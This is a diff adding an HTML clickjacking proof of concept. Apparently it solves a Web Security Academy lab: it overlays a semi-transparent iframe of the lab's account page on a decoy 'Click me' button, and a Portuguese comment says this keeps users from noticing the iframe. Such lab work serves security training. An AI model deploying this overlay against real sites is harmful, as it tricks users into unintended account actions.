@@ -1,0 +1,32 @@
+<html>
+<head>
+    <style>
+        #target_website {
+            position: relative;
+            width: 800px;
+            height: 600px;
+            opacity: 0.5;   /*reduzir opacidade para o user nao perceber que tem um iframe por baixo*/
+            z-index: 2;
+        }
+        #decoy_website {
+            position: absolute;
+            width: 300px;
+            height: 400px;
+            z-index: 1;
+            top: 495px;  
+            left: 77px;
+        }
+    </style>
+</head>
+
+<body>
+    
+    <div id="decoy_website">
+        <button class="button" type="submit"> Click me </button>
+    </div>
+    
+    <iframe id="target_website" src="https://0ae8005c038394e6807d038e00100039.web-security-academy.net/my-account?id=wiener">
+    </iframe>
+
+</body>
+</html>
